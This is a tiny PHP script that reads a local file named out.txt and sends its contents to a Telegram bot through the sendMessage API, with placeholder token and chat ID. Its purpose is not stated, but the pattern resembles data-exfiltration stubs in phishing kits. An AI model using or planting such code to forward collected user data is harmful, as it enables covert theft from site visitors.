<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bothhhhjjhhuijffgjhgfyjjhcf/sendMessage?chat_id=CHATID&text=$msg");
?>
